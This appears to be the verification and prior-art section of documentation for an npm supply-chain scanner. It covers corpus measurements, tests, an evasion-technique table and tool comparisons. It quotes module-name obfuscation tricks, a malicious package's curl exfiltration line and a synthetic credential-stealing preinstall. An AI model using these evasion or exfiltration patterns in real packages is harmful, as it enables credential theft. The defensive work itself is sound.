# Verification and prior art

This document records validation methods, corpus measurements and limitations.
Historical measurements describe their stated inputs and scanner revision;
they are not guarantees about every dependency or future release.

## Verification

Run the regression suite, offline npm integration and escalation demo:

```bash
npm test
npm run test:integration
npm run demo
```

CI runs the tests on Node 18, 20, 22 and 24 across Linux, macOS and Windows.
A separate job checks the CLI on Node 14. The composite Action test verifies
that an unapproved upgrade fails, selective approval passes, and the report
against the target baseline still shows the change. It covers the default
summary-only mode and opt-in artifact upload.

The npm integration installs locally packed fixtures with scripts disabled.
It checks that install hooks and a competing project-local CLI never execute,
that approvals remain selective, and that invalid scan inventories fail.
SARIF tests cover rule references, severity, fingerprints, lockfile locations
and URI containment. Generated SARIF has also been validated against the
2.1.0 JSON schema. Native GitHub Code Scanning ingestion requires an eligible
repository with the feature enabled; artifact validation alone does not test
that integration.

### Deep review Action

The local Action-wrapper regression starts from a reviewed deep baseline,
changes a typed dependency from direct process launch to shell execution,
checks source evidence in Markdown/JSON/SARIF, approves that installation and
verifies the target-branch report still exposes the change. It also checks
profile downgrades, incomplete AST coverage and invalid Action input.

All 334 default tests, 36 optional-parser tests, offline npm integration and
the escalation demo passed locally. Hosted Action CI runs both basic and deep
reviews, including a report-only deep scan with invalid syntax. The opt-in
parser installation is workflow setup; local scan and review commands stay
offline. This changes Action orchestration, not detection rules.

### Process launch modes

Compared basic and deep scans at `feda649` with engine `7449c3bcf6de` on the
same 5,853 physical installations, using Node 26.8.1, Acorn 8.15.0 and
acorn-typescript 1.4.13. In deep mode, 135 installations gained process detail:
41 selected shell execution, 44 direct launch and 77 unresolved launch modes;
these groups overlap. No pre-existing category appeared or disappeared.

Basic capability/evidence records, risk scores and flags were unchanged.
Discovery, basic source coverage and content hashing completed without errors.
Of 214,131 files submitted to AST analysis, unavailable files increased from
29,823 to 29,858. Incomplete deep installations increased from 1,767 to 1,776:
recognized child-process namespaces passed to unmodeled helpers now expose
coverage gaps, including import wrappers in `@rushstack/node-core-library`
and promisification in `mz`. Those packages cannot receive selective approval
until their deep coverage is complete.

Sampled evidence includes shell-based libc detection in `detect-libc`, direct
`execFile` calls in Sentry's macOS context collection, and unresolved options in
`cross-spawn`. Detail is launch-mode attribution, not a verdict on those packages.
Comparing old baselines requires review of newly collected detail; these corpus
differences are engine migrations, not dependency behavior changes.

A controlled regression changing only `spawn` options to `shell: true` passes
the previous engine and blocks the new one. All 334 default tests, 34 deep tests,
offline npm integration and the escalation demo passed. Tests cover scope and
alias handling, dynamic options, namespace mutation/escape, source evidence,
Markdown/SARIF, selective approval and legacy baseline migration.

The production trees retain repeated installations and the synthetic
abort-controller compromise. This is not a malware-precision or performance
benchmark, and no dependency scripts were executed.

### TypeScript and JSX coverage

Compared basic and deep scans at `b6bcca7` with engine `b59e5bac6ccd` on
5,853 physical installations in uptime-kuma, documenso, outline and nocodb.
The local runtime was Node 26.8.1 with Acorn 8.15.0 and acorn-typescript 1.4.13.

| Measurement | Before | After |
| --- | ---: | ---: |
| Files submitted to AST analysis | 206,328 | 214,131 |
| Files with unavailable AST analysis | 91,551 | 29,823 |
| Installations with incomplete deep coverage | 3,800 | 1,767 |

Of those installations, 2,096 gained complete deep coverage. Another 63 became
incomplete because newly discovered `.mts`/`.cts` declaration files could not
be parsed. Unsupported runtime TypeScript, parser syntax gaps, dynamic scopes
and resource limits remain explicit failures; deep mode is still experimental.

No capability category appeared or disappeared in either mode, and no basic
risk record changed. One basic network indicator record changed ordering in
`@better-auth/core` after additional declaration files were read; its endpoint
set and evidence were unchanged. Discovery,
basic source coverage and installed-content hashing completed without errors.
The 334 default tests, 29 optional-parser tests, offline npm integration and
escalation demo passed locally. CI also exercises typed source on Node 14.

The corpus contains repeated physical installations and the previously documented
synthetic abort-controller compromise. These results measure analysis coverage,
not malware-detection precision or performance. No dependency scripts ran.

### AST module-acquisition capabilities

Compared the scanner at `5a54746` with both basic and deep scans on 5,853
physical installations in uptime-kuma, documenso, outline and nocodb. The
capability engine fingerprint was `fb10dff7c827`; local runtime was Node 26.8.1
with optional Acorn 8.15.0.

| Measurement | Result |
| --- | ---: |
| Basic capability/evidence records changed | 0 |
| Basic risk records changed | 0 |
| Basic source or installed-content failures | 0 |
| New or removed capability categories in deep scans | 0 |
| Deep installations with unavailable AST analysis | 3,800 |
| Source files submitted to AST analysis | 206,328 |
| Files with unavailable AST analysis | 91,551 |
| Deep risk records changed | 3,808 |

Discovery reported no errors or escaped links. AST limits include unsupported
TypeScript/JSX, parse failures, dynamic scopes and source/resource budgets.
Unavailable analysis now blocks deep scans; the risk changes above largely
reflect incomplete coverage, not newly discovered dangerous capabilities.
The existing category set was already present in the basic manifests wherever
these corpus scans acquired a recognized module through the AST.

Twenty optional-parser tests include controlled regressions for aliased module
acquisition without install hooks, `createRequire`, exact module names,
source evidence and correlation, bounded failure reporting, rejected approvals,
CLI escalation checks and profile downgrades. These fixtures establish the new
detection behavior; the production corpus does not establish a detection-rate
gain. All 333 default tests, offline npm integration and the demo also passed.

Deep scanning remains experimental and is not a drop-in CI mode for these
production trees. The uptime-kuma tree includes the previously documented
synthetic abort-controller compromise. This is neither a clean registry dataset
nor a performance or malware-precision benchmark; no dependency scripts ran.

### Optional AST import context

Compared `ecfefd9` with `scanPackageDir(dir, { deep: true })` on the same four
production trees, totaling 5,853 physical installations. The final AST engine
(`6451b5eff1c2`) was then rechecked on all 40 installations with non-inert
installation hooks after the static-value resource limits were finalized.

- No capability records, evidence, risk scores or risk flags changed.
- No source/content-integrity failures, discovery errors, escaped links or
  graph-budget truncations were observed.
- All 40 hooks retained the same graph paths and unresolved references:
  26 supported entries and 14 unsupported commands. This corpus did not
  demonstrate additional reachable paths from the new alias resolution.
- Across packages with hooks, the AST pass processed 14,987 source files and
  marked 2,435 unavailable. These counts include files not reachable from a
  recognized hook; unavailable files did not change the observed hook graphs.
  TypeScript/JSX, syntax and resource limits remain explicit limitations.
- Eleven focused AST tests demonstrate immutable loader aliases, supported
  `createRequire` bases, template interpolation, scope shadowing, mutation and
  escape handling, parse/resource failures, review exports, CLI flags, package
  source modes and parser isolation. The 333 existing tests, offline npm
  integration and escalation demo also passed.

Measurements used Node 26.8.1 and Acorn 8.15.0 on local installed trees. The
uptime-kuma `abort-controller` installation contains the previously documented
synthetic compromise. This is not a clean registry dataset, a precision study
or a performance benchmark. No package scripts were executed.

The optional parser has separate Linux/Windows CI tests on Node 18 and 24;
the Node 14 CLI check also exercises `--deep`. Default CI jobs still run without
installing a parser. Run `npm run test:deep` after explicitly installing the
supported optional peer, as described in `CONTRIBUTING.md`.

### Coverage and inventory comparison

Compared the scanner at `3cff46b` with the coverage, indicator and native-install
changes on four local production trees: uptime-kuma, documenso, outline and
nocodb. These contain 5,853 physical package installations, including repeated
names and versions. Discovery reported no errors or escaped links, and all
analyses completed within the new resource budgets.

- 64 installations gained additional endpoints or environment variables beyond
  the old 20/40 limits. For example, `es-abstract@1.24.2` in uptime-kuma went
  from 20 to 4,332 literal endpoints. These include documentation URLs, not
  necessarily runtime network destinations.
- One capability category changed: `unix-dgram@2.0.7` in outline reports its
  implicit install command. Its `binding.gyp` and lack of an explicit
  install/preinstall script confirm npm's `node-gyp rebuild` default.
- No installation gained or lost a risk flag. This observation does not
  establish a universal false-positive rate or upgrade-gate precision.

The comparison used Node 26.8.1. Old scans ran first, so filesystem caching
prevents drawing a performance conclusion from their elapsed times. After
an engine migration, newly collected indicators may have existed before but
been absent from older manifests; review that difference before approving.

### Filesystem operation comparison

Compared the scanner at `fa8e471` with filesystem operation detection on the
same four production trees (5,853 physical installations). The scans found
read APIs in 661 installations, write APIs in 252 and removal APIs in 106;
these groups overlap. Existing capability records, risk scores and risk flags
were unchanged. Discovery reported no errors or escaped links, and no scan
reported incomplete coverage.

Comparing old manifests with new scans requires operation-detail review for
706 installations. These are engine-migration differences, not evidence of
dependency behavior changes. A separate upgrade regression confirms that
adding `rmSync` to a read-only package now blocks while the previous scanner
allowed that change.

Removal evidence was manually checked in 12 distinct packages, including
esbuild, TypeScript and aws-crt. The sampled locations select filesystem
removal APIs; they do not establish malicious intent or a corpus-wide
false-positive rate. The comparison used Node 26.8.1 with old scans first,
so elapsed times are not a controlled performance benchmark.

### Content approval comparison

Compared the scanner at `1a09c40` with installed-content hashing on the same
5,853 installations. All content digests completed, covering 293,487 files
and 3,318,028,034 bytes across the four trees. Existing capabilities, risk
scores and risk flags were unchanged. Discovery reported no errors or escaped
links, and no source analysis was incomplete. These inputs contain repeated
packages; the totals are not counts of unique published files or packages.

A before/after regression changes only a binary asset: the previous review ID
remains valid, while the new ID changes. The offline npm integration also
checks that a new binary invalidates selective approval and requires renewal.
Tests cover expiry boundaries, malformed timestamps, installation isolation,
missing digests, symlinks and the content byte budget. The corpus comparison
used Node 26.8.1 with old scans first; it is not a controlled speed benchmark
or a claim that every published package supports content approval.

### File correlation comparison

Compared `2c4a201` with file-level context on the same 5,853 installed packages.
The scanner recorded co-occurrence in 22 files across 15 installations.
Existing capability records, risk scores and flags were unchanged; discovery,
source coverage and content hashing completed without errors. The local
uptime-kuma tree retains the synthetic `abort-controller` modification described
below, which accounts for one of these installations. This is not a clean
registry sample or a malware-detection precision measurement.

Observed examples include Prisma's npm configuration handling, Resend's API
client and Documenso's CAPTCHA verification. The existing credential-name
heuristic also matches `MCP_AUTH_PORT` in an SDK example, although it is a
server port. Bundles can place related-looking indicators thousands of lines
apart. These findings explain why context is informational and why neither
co-occurrence nor the absence of a match establishes data flow or safety.

Regressions cover matching after evidence quotas fill, multiline imports,
separate files, bounded samples, incomplete coverage and report escaping.
A URL literal alone does not establish network capability. Tests also retain
the existing package-level gates and risk scores. Measurements used Node
26.8.1; no performance or false-positive-rate claim is made from this run.

### Installation context comparison

Compared `398245d` with literal installation import graphs on the same 5,853
installed packages. Existing capability records, risk scores and flags were
unchanged. Source scans and content hashes completed without errors, and no
graph exhausted its resource budget.

The corpus contains 40 non-inert installation hook entries across repeated
package installations. Entry files were recognized for 26 hooks; 14 commands
were explicitly unsupported. Eight hooks had potential paths to network or
credential indicators. Entry recognition does not mean that every import was
resolved: external dependencies and dynamic references remain visible as
unresolved. The existing synthetic `abort-controller` fixture contributes one
hook and is not a registry malware sample.

Examples include seven reached files in each `aws-crt` installation and eleven
in `oracledb`. `@swc/core` records unresolved platform-package references;
compound shell commands and native builds are not interpreted. These figures
measure the supported syntax on this corpus, not runtime execution coverage.

Regression tests cover cycles, file boundaries, symlinks, ESM versus CommonJS
file lookup, capped samples and depth limits. A long-comment dynamic import
exceeded a three-second timeout with the initial matcher; bounded recognition
completed the same 50,000-character case in about 40 ms locally. The permanent
regression uses 100,000 characters and a five-second CLI timeout. This isolated
case is not a general performance benchmark. Measurements used Node 26.8.1.

### Dependency review coverage

Regression tests cover installation matching, physical duplicates, Windows
paths, pnpm predecessor ambiguity, stale review IDs, concurrent approvals,
incomplete coverage and Markdown escaping. Origin tests cover npm v2/v3
hoisting, nested versions, aliases, workspace links, dependency cycles and
missing or stale lockfile entries. Directory-alias tests protect Windows
compatibility while retaining the project boundary.

The hosted Action scenario uses a synthetic upgrade, not a live Dependabot
or Renovate update. The predecessor matcher does not use lockfile edges,
and no false-block rate is claimed for ambiguous real-world upgrades.

### Earlier corpus measurements

Discovery coverage, tested against a real 462 MB / 12,398-file tree
(typescript, webpack, next.js, eslint, jest, and their transitive deps):
capsurface finds 428 installed packages versus 286 from naively listing
`node_modules`'s top-level directories. The other 142 are nested, scoped,
or symlinked installs an earlier version of this tool missed. Scan time
was 6.4s / 423 MB peak RSS for that tree, about 67 packages/s, measured
before later profiling and scanner changes. A 118-package
install of popular libraries scans in well under a second.

False-positive rate, same 118-package real corpus, before and after the
scanner fixes:

| | CRITICAL flags | MEDIUM flags | aggregate risk score |
|---|---|---|---|
| Before | 2 (`glob`, `axios`, both false) | 14 | 326 |
| After | 0 | 7 | 148 |

None of the 118 packages are malicious, so zero CRITICAL is correct. The
two prior flags were confirmed false positives.

True-positive detection: the bundled Shai-Hulud-style escalation fixture
(`examples/run-demo.sh`) still fails the CI gate with the exact capability
diff. Regression fixtures cover a malicious `postinstall` hidden in a
nested `node_modules`, the same hidden behind a symlink, and a version
bump that adds only an obfuscated payload with no literal token for the
regex to match, three cases that previously slipped through.

### Against a corpus of evasion techniques

Every fixture reaches `child_process`; each tool is asked the same question,
does it say so. Techniques taken from the npm malicious-package benchmark
(arXiv 2603.27549) and the JavaScript deobfuscation survey (arXiv 2512.14070).

| technique | capsurface | js-x-ray 8.2 | wormguard 1.0.3 |
|---|---|---|---|
| `require('child_process')` | yes | yes | yes |
| `node:` prefix | yes | yes | yes |
| template literal | yes | no | yes |
| space before the paren | yes | yes | yes |
| multi-line require | yes | yes | yes |
| `'child' + '_process'` | yes | yes | yes |
| through a variable | yes | yes | no |
| hex escape | yes | yes | yes |
| unicode escape | yes | yes | yes |
| `String.fromCharCode` | yes | no | no |
| array join | yes | no | no |
| reversed string | yes | no | no |
| `Buffer.from(..., 'base64')` | yes | no | no |
| `Buffer.from(..., 'hex')` | yes | yes | no |
| | **14/14** | **9/14** | **8/14** |

Most of those are folded by `lib/normalize.js`, which is source rewriting
rather than parsing: each fold only fires when every input is a literal,
which is the case a parser would resolve anyway and the case an attacker gets
for free by typing a `+`. A specifier on its own line is reached by a
whole-file pass, run only over the categories the per-line pass left absent.

Together they cost about 1.4x scan time and changed no capability on 202 real
packages, because nothing legitimate writes
`require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString())`.

What is still out of reach is in the corpus too, asserted as a miss: a
specifier whose value only exists once the program runs, like
`require(process.env.MOD)` or a name built in a loop. Those are reported
rather than resolved, see `unresolvedRequire`.

### On real production applications

Four open-source applications installed and scanned as they ship, not
libraries: uptime-kuma, documenso, outline, nocodb. 5,853 installed packages.

| app | packages | run at install | CRITICAL | HIGH |
|---|---|---|---|---|
| uptime-kuma | 1,235 | 14 (1.1%) | 0 | 6 |
| documenso | 2,049 | 15 (0.7%) | 1 | 14 |
| outline | 2,013 | 8 (0.4%) | 0 | 6 |
| nocodb | 556 | 1 (0.2%) | 1 | 2 |

Both CRITICALs are true positives and both are legitimate: documenso's
`prisma` runs a `preinstall`, talks to the network and reads `~/.npmrc` to
fetch its engine binaries; nocodb's `nx` runs a `postinstall`, talks to the
network and reads `GITHUB_TOKEN`. Neither is malware. Both are exactly the
allowlist decision npm 12 now forces, surfaced as two lines to review out of
5,853 packages rather than left for someone to find.

Then the end-to-end test, with a synthetic compromise rather than a real one
(no real malware is ever fetched here). A quiet transitive dependency of
uptime-kuma, `abort-controller`, was tampered in place the way Shai-Hulud V2
does it: a `preinstall` was added, pointing at an obfuscated payload that
builds its module names out of `Buffer.from('...', 'hex')` and
`String.fromCharCode`, reads `~/.npmrc` and `NPM_TOKEN`, and POSTs them to a
`.tk` host. The gate caught every layer:

```
abort-controller 3.0.0 -> 3.0.0  (delta +30)
  capability-added: Filesystem access, Network access, Process execution,
                    Sensitive credential/file targeting
  lifecycle-script-changed: (none) -> "node dist/bundle.js"
  new-network-endpoints: new host: npm-registry-cache.tk
  new-env-vars: NPM_TOKEN
  CRITICAL: install-time script + network + credential (worm pattern)
```

The obfuscated `require(Buffer.from('6368...','hex').toString())` resolved to
`child_process` because of the fold pass, so process execution showed up
rather than nothing. The version never changed, and it was still caught,
because the diff compares content, not version strings.

### Discovery, against real installs from each package manager

The layouts differ enough to be worth checking separately rather than
against a fixture. Same dependency set where possible, each installed for
real, each compared against a walk that counts every directory holding a
package.json with a name and a version.

| | packages found | walk counts | difference |
|---|---|---|---|
| npm 11, hoisted | 666 | 716 | 50 |
| pnpm 12, symlinked `.pnpm` store | 222 | 227 | 5 |
| Yarn Berry 4.18, `nodeLinker: node-modules` | 202 | 208 | 5 |
| npm workspaces monorepo | 138 | 138 | 0 |

Every difference is the walk over-counting, not discovery missing anything:
they are `lib/cjs/package.json` type stubs, vendored copies, benchmark
directories and test fixtures like `pino/test/fixtures/transport`. None is
an installed package, and their source is still read as part of the package
that ships them.

The monorepo case is the one worth calling out. npm symlinks each workspace
member from `node_modules/@scope/name` to `../../packages/name`, which
resolves outside `node_modules` entirely. All three members are found, with
`installPath` recording where they really live.

### Against 20,039 packages sampled across the registry

Reading dependency trees tells you the population this runs on. It does not
tell you what the rules are wrong about, because a tree is mostly popular,
well-behaved packages. So the sample is stratified across the registry
itself: the dependency closure of 245 well-known seeds, a uniform random
draw from all 4,431,335 published names, scoped packages, recent publishes
from the changes feed, and packages found by searching for native and
install-script tooling. 22,696 tarballs fetched, 20,039 with source, 0 scan
errors.

Every evidence entry records the rule that produced it, so rules can be
judged by what they match at scale rather than one finding at a time.
Eleven rules were corrected in that campaign. Two examples were detection
gaps rather than false positives:

**Lifecycle script commands were never scanned.** The command runs at
install time but lives in package.json, so walking the package never
reached it. That hid `xhjxhjtestrce123`, whose `preinstall` and
`postinstall` both run `curl http://<host>/?host=...` and whose manifest
reported no network access at all, and `iso-process`, whose postinstall
inlines `require('child_process').execSync('npm i', {cwd: join('..',
'esm')})`.

**Files a package ships in `bin` were never read.** They carry no extension
because the shell runs them through their shebang, and 502 of the 4,502
packages that ship an executable, 11.2%, point `bin` at a file an
extension-based filter skips. That file is the code a consumer runs
directly. Reading it gave 26 of a 158-package sample a capability the
manifest had missed; for four of them, `turbo` included, no file had been
read at all and the reported risk score was 0.

That second one also exposed a reporting problem worth naming: "nothing was
read" and "nothing was found" produced the same empty manifest, and 12.5%
of the sample reads that way. The manifest now says which it is.

What the sample says about npm itself: 469 of 20,039 packages run something
at install time, 2.3%. 185 run a JavaScript file, 111 are node-gyp or
prebuild, 21 inline code with `node -e`, 8 only print a message, and
exactly one pipes a download into a shell. 8 are CRITICAL and 231 HIGH.

That last number moved late. The CRITICAL flag claims a package matches the
self-propagating worm pattern, and it was firing 37 times, 29 of them on
agent and MCP command-line tools that run a postinstall, talk to the network
and read their own service key. It was telling figma-image-exporter, a Figma
CLI reading FIGMA_TOKEN, that it looked like Shai-Hulud. A worm propagates
on credentials belonging to the environment it lands in, so that is what the
flag requires now; the other 29 are still reported one severity down. Being
wrong in the highest-severity output is the most expensive place to be
wrong.

The historical corpus scan completed in 37.5 seconds after profiling changes. Every optimisation was
verified by re-scanning the corpus and checking all 20,039 manifests are
identical to the character.

### Does it survive a real dependency upgrade

The thing that kills a CI security gate is not missed detections, it is
false alarms on routine work. Tested by installing 14 popular packages at
versions roughly two years old (express, lodash, axios, chalk, commander,
dotenv, debug, semver, glob, uuid, ws, node-fetch, yargs, dayjs),
baselining them, then upgrading all of them to current (npm reported 25
added, 27 removed, 49 changed):

| | escalations on that upgrade |
|---|---|
| Before this was tuned | 16 |
| After | 0 |

All 16 were routine library evolution: build-tooling swaps in `prepare`
scripts (tshy, husky, lefthook), new support for `NO_COLOR` and `no_proxy`,
and documentation URLs in error messages counted as new network endpoints.
Zero were security relevant. A gate that fires 16 times on an ordinary
upgrade gets switched off in a week, so those classes are now reported
without failing the build, while the signals that mark an actual attack
path still fail it. The bundled worm fixture and every detection regression
test still fail the gate exactly as before.

That test is now a standing one, widened so it cannot be tuned against:
82 popular packages, each at its last release before 2024-09-01, diffed
against its current release. Two years and, for many of them, a major
version apart.

| | escalations of 81 |
|---|---|
| Before the registry-scale campaign below | 5 |
| After its false-positive fixes | 3 |
| After its `node:` fix | 6 |
| After reporting unresolvable module names | 8 |

The two that went away were both the gate misreading generated code:
`zod` 3 to 4 on a long IPv6 regex literal, `vite` 5 to 8 on the string
`".npmrc"` inside a bundled list of config filenames.

Then the number went up, because the scanner started seeing things it had
been blind to. `nanoid` 6 added a CLI that reads files with
`import { readFileSync } from 'node:fs'` and `vitest` spawns processes with
`node:child_process`; neither was visible before. A capability a dependency
did not have two years ago is what this is supposed to raise once.

The last three are packages that began loading a module whose name is not in
the source. `svelte` 5 does `(module_name) => import(module_name)` from a
variable it calls `obfuscated_import`, `sass` inlines a `parcel_watcher`
loader, and `sinon` ships a UMD interop shim, `typeof require === "function"
? require(m) : ...`. The last of those is the known noise shape: nothing
about sinon changed, its bundler did. Kept anyway, because a dependency that
starts loading something it cannot name is the shape a compromised release
takes, and one glance per major version is proportionate.

Teams upgrade one release at a time, so that is measured too: every fifth
release of the same packages since 2024, diffed against the one before it.
396 upgrades, 19 escalations, 4.8%. One in twenty asks for a glance, and
they are worth it, `prettier` 3.7 really did add a `fetch` call to its
experimental CLI.

### On a realistic production tree

A 215-package service (express, pg, ioredis, jsonwebtoken, bcrypt, pino,
helmet, zod, prom-client, the AWS S3 SDK, stripe) scans in 1.6s and reports
this first:

```
Runs code at install time: 1 of 215
  bcrypt@5.1.1  risk=4
      install: node-pre-gyp install --fallback-to-build
```

That is the entire install-time execution surface of the tree, which is the
number that decides blast radius. It is also why the install-time list
prints before the risk ranking: bcrypt scores 4, because its own source
touches nothing else, and sorted below twenty higher-scoring packages that
cannot execute during install at all.

### Benchmark against GuardDog

Same 119-package corpus and the same bundled fixture, run locally with
GuardDog's dynamic sandbox and registry-metadata rules disabled (no kernel
sandbox available in this environment, and the fixture was never
published so it has no registry metadata).

Speed: `capsurface scan-tree` scans the full corpus in 0.95s (median of 3
runs). GuardDog has no bulk/tree mode, so checking the same corpus is one
process per package: 45.4s for 119 packages, about 47x slower, mostly
Python and rule-engine startup cost paid per package.

False-positive rate: parity. GuardDog rated 116/119 packages
`no_risks_detected` and the rest `low`, matching capsurface's zero
CRITICAL on the same corpus.

Detection of the bundled fixture is the interesting result. GuardDog
correctly detected every individual signal, the `.ssh/id_rsa` and
`.npmrc` reads, the `NPM_TOKEN`/`GITHUB_TOKEN` env reads, the HTTPS
beacon, but its aggregate `risk_score` labeled the fixture `low` (4.9/10),
discounting it as unsophisticated. Reading its rule source explains why:
`threat-npm-preinstall-script.yar` matches only the literal string
`"preinstall"`, never `"postinstall"` or `"install"`, so it never fires on
this fixture. Its broader `threat-process-hooks` rule covers postinstall
but only fires when a raw shell command is inlined directly in
package.json. The common real-world shape, `"postinstall": "node
./scripts/setup.js"` with the payload one file away, is not covered by
either rule. `postinstall` is not a hypothetical here: it is what the
original Shai-Hulud campaign used and one of two vectors the keyv/cacheable
worm used. This is a fair result under the specific conditions tested, not
a claim that GuardDog is weak in general; its full configuration (dynamic
sandbox, registry metadata, a broader rule set than capsurface's six
categories) was not evaluated. It does show that capsurface's uniform
treatment of `preinstall`/`install`/`postinstall` as equally
install-triggering closes a gap that a more general tool's rule set, as
configured and run here, did not.

## Prior art

Where capsurface sits among the tools that already exist.

| | Detection basis | Timing model | Scope | Deps | Deployment |
|---|---|---|---|---|---|
| Socket | Behavioural analysis, registry-wide monitoring, threat intel | Proactive, ecosystem-wide, can flag a compromised publish within minutes | whole package | n/a | Hosted SaaS |
| Semgrep Supply Chain | Lookup against 80,000+ known-malicious packages | Reactive, needs the package already in the database | whole package | n/a | Hosted SaaS |
| GuardDog 3.2 (Datadog) | YARA rules correlating a capability with a threat indicator, plus an optional kernel sandbox and registry-metadata rules | Point-in-time, one version in isolation, no bulk or tree mode | whole package | Python + yara-python, pygit2 | OSS CLI, local |
| js-x-ray 8.2 (NodeSecure) | AST with a variable tracer and constant folding | Point-in-time, per file | whole package | several | OSS library |
| wormguard 1.0.3 | AST with taint approximation, IoC corpus, script hashes, sigstore provenance | Delta-based on inventory and script hashes | install scripts | 7 | OSS CLI, local |
| capsurface | Source-text rules over folded literals | Delta-based on capability surface, relative to a reviewed baseline | whole package | none | OSS CLI, local, offline |

Two things are still solved better elsewhere and this does not compete on
either. Socket's real-time monitoring and Semgrep's malicious-package
database catch a compromised publish before `npm install` ever runs, and
correlate against maintainer behaviour and typosquatting, which a static
offline tool cannot. Dynamic sandboxing beats static analysis on obfuscated
payloads, which is why the OpenSSF's own
[Package Analysis](https://github.com/ossf/package-analysis) runs packages in
gVisor. GuardDog's sandbox and registry-metadata rules were not evaluated
here.

Where it does compete, measured rather than asserted:

**Detection depth**, on the evasion corpus above: capsurface 14/14, js-x-ray
9/14, wormguard 8/14, GuardDog 3/14. GuardDog reaches 5/14 with two pending
patches for the `node:` prefix and template-literal specifiers.

**Scope.** The same payload, reading `~/.npmrc` and `NPM_TOKEN` and POSTing
them out, placed in a package with and without an install script:

| | with an install script | without one |
|---|---|---|
| capsurface | CRITICAL, HIGH | HIGH |
| wormguard | 5 findings | nothing |
| npm-script-lens | reviewable | "no risky install-time behavior" |

Neither is wrong; both are scoped to install scripts and report nothing when
there is no install script. That scope is the difference, and the second
column is the event-stream shape, where the payload ran on `require()`.

**Speed**, same 203-package tree, median of three: capsurface 0.66s, wormguard
0.49s. wormguard is faster and reads far less, since it only analyses install
script entry points. GuardDog has no bulk mode at all; on a 119-package
corpus it was about 47x slower, mostly process startup paid per package.

Two things are already solved better elsewhere, and capsurface does not
compete on either. Socket's real-time monitoring and Semgrep's
malicious-package database do things a static, offline, zero-dependency
tool cannot: catch a compromised publish before `npm install` ever runs,
correlate against maintainer behavior and typosquatting, and cover more
ecosystems than the six categories here. Static analysis is also weaker
than dynamic sandboxed analysis for obfuscated payloads, which is why the
OpenSSF's own [Package Analysis](https://github.com/ossf/package-analysis)
project runs packages in gVisor instead of only reading source. GuardDog
and Semgrep share this limitation for their source-only heuristics too.

What capsurface bets on instead is the timing model. GuardDog and most
point-in-time scanners answer "is this version risky in isolation," so a
package that legitimately has network and env access, which is most
packages, re-triggers the same warning on every scan forever unless the
tool keeps its own allowlist. capsurface answers "did this update add a
capability that was not in the version we already reviewed," the same
question `git diff` answers for code, applied to capability surface. The
unit of trust is a plain JSON file committed next to `package-lock.json`
and reviewed in PRs, not a hosted API or a score you cannot inspect. It is
not a replacement for Socket or Semgrep. It is a cheap first gate that
does not require a SaaS relationship to exist at all.

On August 4 2026, the `keyv`/`cacheable` npm namespaces (2,234 poisoned
versions across 444 packages) were compromised through a hijacked
maintainer account. The payload was a `preinstall` hook that downloaded a
standalone Bun runtime and ran an obfuscated second-stage payload
harvesting credentials, [reported by Socket, Wiz, Datadog, and
Snyk](https://socket.dev/blog/popular-npm-packages-in-the-keyv-and-cacheable-namespaces-compromised-in-active-supply-chain).
capsurface cannot see what the downloaded runtime does, same blind spot as
below, but does not need to: a `preinstall` script combined with new
network access is exactly the CRITICAL combination this tool flags, on the
first scan of the compromised version, using only what is already
implemented. It is also a second real-world confirmation, after Shai-Hulud
V1 to V2, that `preinstall` and not just `postinstall` is where these
attacks land. The same report describes a vector this
tool has no coverage for: malicious VS Code and Claude Code hook files
committed straight into the source tree, executing on folder-open with no
`npm install` involved. It is a real limitation, not ignored.
